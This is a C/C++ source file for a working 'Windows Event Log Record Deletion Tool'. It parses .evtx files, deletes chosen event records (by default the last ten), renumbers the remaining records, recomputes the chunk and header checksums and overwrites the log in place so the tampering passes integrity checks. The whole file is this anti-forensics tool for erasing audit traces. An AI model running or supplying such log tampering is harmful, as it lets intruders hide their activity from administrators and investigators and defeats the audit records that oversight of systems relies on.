#include <windows.h>
#include <stdio.h>
#include <new>
#define SUCCESSED 0
#define FAILURE 1
#define ERROR_INVALID_SIGNATURE 2
#define ERROR_INVALID_RECORD 3
#define ERROR_MEMORY_ALLOCATION 4
#pragma pack(1)
typedef struct _ELFFILE_HEADER
{
	ULONG64 Signature;
	ULONG64 FirstChunkNumber;
	ULONG64 LastChunkNumber;
	ULONG64 NextRecordIdentifier;
	ULONG HeaderSize;
	WORD MinorVersion;
	WORD MajorVersion;
	WORD ChunkDataOffset;
	ULONG NumberOfChunks;
	UCHAR Unknown[74];
	ULONG FileFlags;
	ULONG Checksum;
} ELFFILE_HEADER, * PELFFILE_HEADER;

typedef struct _CHUNK_HEADER
{
	ULONG64 Signature;
	ULONG64 FirstEventRecordNumber;
	ULONG64 LastEventRecordNumber;
	ULONG64 FirstEventRecorIdentifier;
	ULONG64 LastEventRecordIdentifier;
	ULONG HeaderSize;
	ULONG LastEventRecordDataOffset;
	ULONG FreeSpaceOffset;
	ULONG EventRecordsChunksum;
	UCHAR Unknown1[64];
	ULONG Unknown2;
	ULONG Checksum;
} CHUNK_HEADER, * PCHUNK_HEADER;

typedef struct _EVENT_RECORD
{
	ULONG Signature;
	ULONG Size;
	ULONG64 EventRecordIdentifier;
	ULONG64 WrittenDateAndTime;
} EVENT_RECORD, * PEVENT_RECORD;
#pragma pack()

unsigned int CRC32[256];
static void init_table()
{
	int i, j;
	unsigned int crc;
	for (i = 0; i < 256; i++)
	{
		crc = i;
		for (j = 0; j < 8; j++)
		{
			if (crc & 1)
			{
				crc = (crc >> 1) ^ 0xEDB88320;
			}
			else
			{
				crc = crc >> 1;
			}
		}
		CRC32[i] = crc;
	}
}

unsigned int GetCRC32(unsigned char* buf, int len)
{
	unsigned int ret = 0xFFFFFFFF;
	int i;
	static char init = 0;
	if (!init)
	{
		init_table();
		init = 1;
	}
	for (i = 0; i < len; i++)
	{
		ret = CRC32[((ret & 0xFF) ^ buf[i])] ^ (ret >> 8);
	}
	ret = ~ret;

	return ret;
}

PVOID GetTemplateIdentifierPtr(PBYTE chunkPtr, PBYTE recordPtr, PULONG a3)
{
	if (recordPtr)
	{
		PBYTE xmlDataPtr = recordPtr + 24;

		if (0x1010f != *(PULONG)xmlDataPtr)
		{
			while (0x0b == *xmlDataPtr)
				xmlDataPtr += 2 * *(PWORD)(xmlDataPtr + 1) + 3;
		}

		PBYTE templateInstance = NULL;
		if (0x0c == *(xmlDataPtr + 4))
			templateInstance = xmlDataPtr + 4;
		if (templateInstance)
		{
			PBYTE v8 = NULL;

			if ((ULONG_PTR)templateInstance - (ULONG_PTR)chunkPtr + 10 ==
				*(PULONG)(templateInstance + 6))
			{
				v8 = templateInstance + 14;
			}
			else
			{
				ULONG templateDefinitionOffset = *(PULONG)(templateInstance + 6);
				ULONG tmp = (ULONG)(recordPtr - chunkPtr);
				if (templateDefinitionOffset < tmp || templateDefinitionOffset > tmp + *(PULONG)(recordPtr + 4))
					goto LABEL;
				v8 = templateDefinitionOffset + chunkPtr + 4;
			}
			if (v8)
			{
				if (*(PULONG)v8 == *(PULONG)(templateInstance + 2))
				{
					ULONG tmp = *(PULONG)(v8 + 16);
					*a3 = *(PULONG)(tmp + v8 + 20);
					return tmp + v8 + 24;
				}
				return NULL;
			}
		LABEL:
			*a3 = *(PULONG)(templateInstance + 10);
			return templateInstance + 14;
		}
	}

	return NULL;
}

PVOID ModifyRecordNumber(PBYTE chunkPtr, PEVENT_RECORD recordPtr, ULONG64 eventRecordIdentifier)
{
	ULONG v9 = 0;
	PWORD templateIdentifierPtr = (PWORD)GetTemplateIdentifierPtr(chunkPtr, (PBYTE)recordPtr, &v9);

	if (templateIdentifierPtr)
	{
		ULONG count = 10;
		PULONG64 v7 = (PULONG64)&templateIdentifierPtr[2 * v9];

		do
		{
			WORD v8 = *templateIdentifierPtr;
			templateIdentifierPtr += 2;
			v7 = (PULONG64)((PBYTE)v7 + v8);
			--count;
		} while (count);
		*v7 = eventRecordIdentifier;
		recordPtr->EventRecordIdentifier = eventRecordIdentifier;
	}

	return templateIdentifierPtr;
}

PVOID GetTemplateInstancePtr(PBYTE recordPtr)
{
	PBYTE result = NULL;

	if (recordPtr)
	{
		PBYTE xmlDataPtr = recordPtr + 24;

		if (0x1010f != *(PULONG)(recordPtr + 24))
		{
			while (0xb == *xmlDataPtr)
				xmlDataPtr += 2 * *(PWORD)(xmlDataPtr + 1) + 3;
		}
		if (0x0c == *(xmlDataPtr + 4))
			result = xmlDataPtr + 4;
	}

	return result;
}

PVOID GetTemplateDefinition(PBYTE chunkPtr, PEVENT_RECORD recordPtr, PBYTE templateInstancePtr)
{
	PBYTE result = NULL;

	do
	{
		if (!recordPtr || !templateInstancePtr)
			break;
		if ((ULONG_PTR)templateInstancePtr - (ULONG_PTR)chunkPtr + 10 ==
			*(PULONG)(templateInstancePtr + 6))
			return templateInstancePtr + 14;

		ULONG templateDefinitionOffset = *(PULONG)(templateInstancePtr + 6);
		ULONG64 v6 = (ULONG64)((PBYTE)recordPtr - chunkPtr);
		if ((templateDefinitionOffset >= v6) &&
			(templateDefinitionOffset <= v6 + recordPtr->Size))
			result = templateDefinitionOffset + chunkPtr + 4;
	} while (FALSE);

	return result;
}

// Debug logging macro
#define DEBUG_LOG(fmt, ...) printf("[DEBUG] " fmt "\n", ##__VA_ARGS__)
#define ERROR_LOG(fmt, ...) printf("[ERROR] " fmt "\n", ##__VA_ARGS__)

ULONG DeleteRecord(PVOID mapAddress, ULONG64 recordNumber)
{
	ULONG result = FAILURE;
	PELFFILE_HEADER elfFilePtr = (PELFFILE_HEADER)mapAddress;

	DEBUG_LOG("Starting deletion of record: %llu", recordNumber);

	do
	{
		// Validate file signature
		if (memcmp(mapAddress, "ElfFile", 8))
		{
			ERROR_LOG("Invalid file signature");
			result = ERROR_INVALID_SIGNATURE;
			break;
		}

		// Validate record number
		if (recordNumber == 0 || recordNumber >= elfFilePtr->NextRecordIdentifier)
		{
			ERROR_LOG("Invalid record number: %llu", recordNumber);
			result = ERROR_INVALID_RECORD;
			break;
		}

		ULONG crc32 = 0;
		BOOL unknownFlag = FALSE;
		BOOL deleted = FALSE;
		BOOL isSingleRecord = FALSE;
		ULONG64 chunkTotal = 0;
		ULONG64 chunkCount = 0;
		ULONG64 firstChunkNumber = elfFilePtr->FirstChunkNumber;
		ULONG64 lastChunkNumber = elfFilePtr->LastChunkNumber;
		ULONG numberOfChunk = elfFilePtr->NumberOfChunks;

		// Validate chunk numbers
		if (firstChunkNumber >= 0xffffffff || lastChunkNumber >= 0xffffffff)
		{
			ERROR_LOG("Invalid chunk numbers - First: %llu, Last: %llu",
				firstChunkNumber, lastChunkNumber);
			break;
		}

		// Calculate total chunks
		if (lastChunkNumber >= firstChunkNumber)
			chunkTotal = lastChunkNumber - firstChunkNumber + 1;
		else
			chunkTotal = lastChunkNumber + numberOfChunk - firstChunkNumber;

		DEBUG_LOG("Processing %llu chunks", chunkTotal);

		// Process each chunk
		while (chunkCount < chunkTotal)
		{
			ULONG64 chunkOffset = firstChunkNumber + chunkCount;
			if (chunkOffset > numberOfChunk)
				chunkOffset = chunkOffset - numberOfChunk;
			chunkOffset <<= 16;
			PCHUNK_HEADER currentChunk = (PCHUNK_HEADER)(chunkOffset + (PBYTE)elfFilePtr + 0x1000);
			if (0xffffffffffffffff != currentChunk->LastEventRecordIdentifier)
			{
				PEVENT_RECORD prevRecordPtr = NULL;
				PEVENT_RECORD currentRecordPtr = NULL;
				PEVENT_RECORD nextRecordPtr = (PEVENT_RECORD)((PBYTE)currentChunk + 0x200);
				while (nextRecordPtr)
				{
					prevRecordPtr = currentRecordPtr;
					currentRecordPtr = nextRecordPtr;
					nextRecordPtr = (PEVENT_RECORD)((PBYTE)nextRecordPtr + nextRecordPtr->Size);

					if (0x00002a2a != currentRecordPtr->Signature)
						break;
					ULONG64 eventRecordIdentifier = currentRecordPtr->EventRecordIdentifier;
					if ((eventRecordIdentifier >= currentChunk->LastEventRecordIdentifier) ||
						(currentRecordPtr == nextRecordPtr))
						nextRecordPtr = NULL;
					if (eventRecordIdentifier >= recordNumber)
					{
						if (eventRecordIdentifier > recordNumber || deleted)
						{
							if (deleted)
							{
								ModifyRecordNumber((PBYTE)currentChunk, currentRecordPtr, eventRecordIdentifier - 1);
							}
						}
						else
						{
							if (!nextRecordPtr && !prevRecordPtr)
							{
								currentChunk->FirstEventRecordNumber = 1;
								currentChunk->LastEventRecordNumber = 0xffffffffffffffff;
								currentChunk->FirstEventRecorIdentifier = 0xffffffffffffffff;
								currentChunk->LastEventRecordIdentifier = 0xffffffffffffffff;
								currentChunk->LastEventRecordDataOffset = 0;
								currentChunk->FreeSpaceOffset = 512;
								memset((PBYTE)currentChunk + 128, 0, 0x180);
								isSingleRecord = TRUE;
								deleted = TRUE;
								result = SUCCESSED;
								break;
							}
							if (prevRecordPtr)
							{
								ULONG TempprevRecordPtrSize = prevRecordPtr->Size;
								prevRecordPtr->Size += currentRecordPtr->Size;
								*(PULONG)(prevRecordPtr->Size + (PBYTE)prevRecordPtr - 4) = prevRecordPtr->Size;
								memset(currentRecordPtr, 0, currentRecordPtr->Size - 4);
								deleted = TRUE;
								result = SUCCESSED;
								currentRecordPtr = prevRecordPtr;
								if (currentChunk->LastEventRecordIdentifier == recordNumber)
								{
									currentChunk->LastEventRecordDataOffset = currentChunk->LastEventRecordDataOffset - TempprevRecordPtrSize;
								}
							}
							else
							{
								PBYTE xmlDataPtr = (PBYTE)currentRecordPtr + 24;
								PBYTE currentRecordTemplateInstancePtr = (PBYTE)GetTemplateInstancePtr((PBYTE)currentRecordPtr);
								PBYTE nextRecordTemplateInstancePtr = (PBYTE)GetTemplateInstancePtr((PBYTE)nextRecordPtr);
								*(PULONG)xmlDataPtr = 0x1010f;
								*(PWORD)(xmlDataPtr + 4) = 0x10c;
								if (currentRecordTemplateInstancePtr)
								{
									if (nextRecordPtr)
									{
										ULONG a3 = 0;
										PBYTE templateIdentifierPtr = (PBYTE)GetTemplateIdentifierPtr((PBYTE)currentChunk, (PBYTE)nextRecordPtr, &a3);
										if (templateIdentifierPtr)
										{
											PBYTE templateDefinition = (PBYTE)GetTemplateDefinition((PBYTE)currentChunk, currentRecordPtr, currentRecordTemplateInstancePtr);
											*(PULONG)(templateDefinition + 16) = templateIdentifierPtr - templateDefinition - 24;
											currentRecordPtr->Size += nextRecordPtr->Size;
											*(PULONG)(currentRecordPtr->Size + (PBYTE)currentRecordPtr - 4) = currentRecordPtr->Size;
											currentRecordPtr->WrittenDateAndTime = nextRecordPtr->WrittenDateAndTime;
											*(PULONG)(currentRecordTemplateInstancePtr + 10) = *(PULONG)(nextRecordTemplateInstancePtr + 10);
											ModifyRecordNumber((PBYTE)currentChunk, currentRecordPtr, recordNumber);
											ModifyRecordNumber((PBYTE)currentChunk, nextRecordPtr, recordNumber);
											deleted = TRUE;
											result = SUCCESSED;
										}
										else
										{
											ModifyRecordNumber((PBYTE)currentChunk, currentRecordPtr, recordNumber);
											ModifyRecordNumber((PBYTE)currentChunk, nextRecordPtr, recordNumber);
											currentRecordPtr->WrittenDateAndTime = nextRecordPtr->WrittenDateAndTime;
											*(PULONG64)(currentRecordTemplateInstancePtr + 10) = *(PULONG)(nextRecordTemplateInstancePtr + 10);
											*(PULONG)xmlDataPtr = 11;
											*(PWORD)(xmlDataPtr + 1) = 0;
											*(xmlDataPtr + 3) = 11;
											*(PWORD)(xmlDataPtr + 4) = ((ULONG64)(ULONG)((PBYTE)nextRecordPtr - (PBYTE)currentRecordPtr) - 6) >> 1;
											currentRecordPtr->Size += nextRecordPtr->Size;
											*(PULONG)(currentRecordPtr->Size + (PBYTE)currentRecordPtr - 4) = currentRecordPtr->Size;
											deleted = TRUE;
											result = SUCCESSED;
										}
										nextRecordPtr = (PEVENT_RECORD)((PBYTE)currentRecordPtr + currentRecordPtr->Size);
									}
								}
							}
						}
					}
				}
				if (deleted)
				{
					ULONG64 lastEventRecordNumber = currentChunk->LastEventRecordNumber;
					ULONG64 lastEventRecordIdentifier = currentChunk->LastEventRecordIdentifier;
					if (0xffffffffffffffff != lastEventRecordNumber || 0xffffffffffffffff != lastEventRecordIdentifier)
					{
						ULONG64 firstEventRecordIdentifier = currentChunk->FirstEventRecorIdentifier;
						if (firstEventRecordIdentifier <= recordNumber && lastEventRecordIdentifier >= recordNumber)
						{
							currentChunk->LastEventRecordNumber = lastEventRecordNumber - 1;
							currentChunk->LastEventRecordIdentifier = lastEventRecordIdentifier - 1;
						}
						else
						{
							currentChunk->FirstEventRecordNumber -= 1;
							currentChunk->LastEventRecordNumber = lastEventRecordNumber - 1;
							currentChunk->FirstEventRecorIdentifier = firstEventRecordIdentifier - 1;
							currentChunk->LastEventRecordIdentifier -= 1;
						}
					}
				}
				// Add memory safety checks for ChecksumBuf allocations
				unsigned char* ChecksumBuf1 = nullptr;
				try {
					ChecksumBuf1 = new unsigned char[currentChunk->FreeSpaceOffset - 512];
					if (!ChecksumBuf1) {
						ERROR_LOG("Memory allocation failed for ChecksumBuf1");
						result = ERROR_MEMORY_ALLOCATION;
						break;
					}

					memcpy(ChecksumBuf1, (PBYTE)currentChunk + 512,
						currentChunk->FreeSpaceOffset - 512);
					crc32 = GetCRC32(ChecksumBuf1, currentChunk->FreeSpaceOffset - 512);
					delete[] ChecksumBuf1;

					if (crc32)
					{
						currentChunk->EventRecordsChunksum = crc32;
						DEBUG_LOG("Updated chunk checksum: 0x%08X", crc32);
					}
					else
					{
						unknownFlag = TRUE;
						DEBUG_LOG("Zero checksum detected, setting unknown flag");
					}
				}
				catch (std::bad_alloc& e) {
					ERROR_LOG("Memory allocation failed: %s", e.what());
					result = ERROR_MEMORY_ALLOCATION;
					break;
				}
				unsigned char* ChecksumBuf2 = new unsigned char[504];
				memcpy(ChecksumBuf2, (PBYTE)currentChunk, 120);
				memcpy(ChecksumBuf2 + 120, (PBYTE)currentChunk + 128, 384);
				crc32 = GetCRC32(ChecksumBuf2, 504);
				currentChunk->Checksum = crc32;
			}
			chunkCount++;
			DEBUG_LOG("Processed chunk %llu of %llu", chunkCount, chunkTotal);
		}
		if (isSingleRecord)
		{
			ULONG count = 0;
			while (count < chunkTotal)
			{
				PCHUNK_HEADER currentChunkPtr = NULL;
				PCHUNK_HEADER nextChunkPtr = NULL;
				ULONG64 tmp = firstChunkNumber + count;
				if (tmp > numberOfChunk)
					tmp -= numberOfChunk;
				currentChunkPtr = (PCHUNK_HEADER)((tmp << 16) + (PBYTE)elfFilePtr + 0x1000);
				if (++count < chunkTotal)
				{
					tmp = firstChunkNumber + count;
					if (tmp > numberOfChunk)
						tmp -= numberOfChunk;
					nextChunkPtr = (PCHUNK_HEADER)((tmp << 16) + (PBYTE)elfFilePtr + 0x1000);
				}
				if (0xffffffffffffffff == currentChunkPtr->LastEventRecordNumber && 0xffffffffffffffff == currentChunkPtr->LastEventRecordIdentifier)
				{
					if (nextChunkPtr)
					{
						memcpy(currentChunkPtr, nextChunkPtr, 0x10000);
						nextChunkPtr->FirstEventRecordNumber = 1;
						nextChunkPtr->LastEventRecordNumber = 0xffffffffffffffff;
						nextChunkPtr->FirstEventRecorIdentifier = 0xffffffffffffffff;
						nextChunkPtr->LastEventRecordIdentifier = 0xffffffffffffffff;
						nextChunkPtr->LastEventRecordDataOffset = 0;
						nextChunkPtr->FreeSpaceOffset = 512;
						memset((PBYTE)nextChunkPtr + 128, 0, 0x180);
					}
					else
					{
						if (lastChunkNumber)
							elfFilePtr->LastChunkNumber = lastChunkNumber - 1;
						else
							elfFilePtr->LastChunkNumber = numberOfChunk - 1;
					}
				}
			}
		}
		if (deleted)
		{
			DEBUG_LOG("Record %llu successfully deleted", recordNumber);
			elfFilePtr->NextRecordIdentifier -= 1;
			DEBUG_LOG("Updated NextRecordIdentifier to %llu",
				elfFilePtr->NextRecordIdentifier);
		}
		crc32 = 0;
		unsigned char* ChecksumBuf3 = new unsigned char[120];
		memcpy(ChecksumBuf3, (PBYTE)elfFilePtr, 120);
		crc32 = GetCRC32(ChecksumBuf3, 120);
		elfFilePtr->Checksum = crc32;
		if (!unknownFlag)
			*(PULONG)((PBYTE)elfFilePtr + 118) &= 0xfffffffe;
	} while (FALSE);
	return result;
}

// Add new function to get total record count
ULONG64 GetTotalRecordCount(PVOID mapAddress)
{
	PELFFILE_HEADER elfFilePtr = (PELFFILE_HEADER)mapAddress;

	// Validate file signature
	if (memcmp(mapAddress, "ElfFile", 8))
	{
		ERROR_LOG("Invalid file signature");
		return 0;
	}

	return elfFilePtr->NextRecordIdentifier - 1; // -1 because IDs start from 1
}

// Add new function to delete range of records
ULONG DeleteRecordRange(PVOID mapAddress, ULONG64 startRecord, ULONG64 endRecord)
{
	ULONG result = SUCCESSED;
	ULONG64 totalRecords = GetTotalRecordCount(mapAddress);

	DEBUG_LOG("Total records in file: %llu", totalRecords);
	DEBUG_LOG("Attempting to delete records from %llu to %llu", startRecord, endRecord);

	// Validate range
	if (startRecord == 0 || endRecord == 0 || startRecord > endRecord)
	{
		ERROR_LOG("Invalid record range: %llu - %llu", startRecord, endRecord);
		return ERROR_INVALID_RECORD;
	}

	if (endRecord > totalRecords)
	{
		ERROR_LOG("End record %llu exceeds total records %llu", endRecord, totalRecords);
		return ERROR_INVALID_RECORD;
	}

	// Delete records in reverse order to maintain consistency
	for (ULONG64 currentRecord = endRecord; currentRecord >= startRecord; currentRecord--)
	{
		DEBUG_LOG("Deleting record %llu", currentRecord);
		ULONG deleteResult = DeleteRecord(mapAddress, currentRecord);
		if (deleteResult != SUCCESSED)
		{
			ERROR_LOG("Failed to delete record %llu, error: %d", currentRecord, deleteResult);
			result = deleteResult;
			break;
		}
	}

	return result;
}

int main()
{
	ULONG result = FAILURE;
	FILE* fp = nullptr;

	printf("=== Windows Event Log Record Deletion Tool ===\n");

	int err = fopen_s(&fp, "1.evtx", "rb");
	if (err != 0)
	{
		ERROR_LOG("Failed to open source file. Error code: %d", err);
		return FAILURE;
	}

	// Get file size
	fseek(fp, 0, SEEK_END);
	long len = ftell(fp);
	DEBUG_LOG("File size: %d bytes", len);

	// Allocate buffer
	unsigned char* buf = nullptr;
	try {
		buf = new unsigned char[len];
		if (!buf) {
			ERROR_LOG("Memory allocation failed");
			fclose(fp);
			return ERROR_MEMORY_ALLOCATION;
		}
	}
	catch (std::bad_alloc& e) {
		ERROR_LOG("Memory allocation failed: %s", e.what());
		fclose(fp);
		return ERROR_MEMORY_ALLOCATION;
	}

	// Read file content
	fseek(fp, 0, SEEK_SET);
	size_t readSize = fread(buf, 1, len, fp);
	if (readSize != len) {
		ERROR_LOG("File read failed. Read %zu bytes of %ld bytes", readSize, len);
		delete[] buf;
		fclose(fp);
		return FAILURE;
	}
	fclose(fp);

	// Get total records
	ULONG64 totalRecords = GetTotalRecordCount(buf);
	if (totalRecords == 0) {
		ERROR_LOG("Failed to get total record count");
		delete[] buf;
		return FAILURE;
	}

	DEBUG_LOG("Total records found: %llu", totalRecords);

	// Calculate range to delete (last 10 records in this example)
	ULONG64 recordsToDelete = 10;
	ULONG64 startRecord = (totalRecords > recordsToDelete) ?
		(totalRecords - recordsToDelete + 1) : 1;
	ULONG64 endRecord = totalRecords;

	// Delete record range
	result = DeleteRecordRange(buf, startRecord, endRecord);
	if (result == SUCCESSED) {
		DEBUG_LOG("Successfully deleted records %llu to %llu", startRecord, endRecord);
	}
	else {
		ERROR_LOG("Failed to delete record range with error: %d", result);
		delete[] buf;
		return result;
	}

	// Write modified content to new file
	FILE* fp2 = nullptr;
	err = fopen_s(&fp2, "1.evtx", "wb+");
	if (err != 0)
	{
		ERROR_LOG("Failed to create destination file. Error code: %d", err);
		delete[] buf;
		return FAILURE;
	}

	size_t writeSize = fwrite(buf, len, 1, fp2);
	if (writeSize != 1) {
		ERROR_LOG("File write failed. Wrote %zu items", writeSize);
		delete[] buf;
		fclose(fp2);
		return FAILURE;
	}

	fclose(fp2);
	delete[] buf;

	printf("Operation completed successfully.\n");
	return SUCCESSED;
}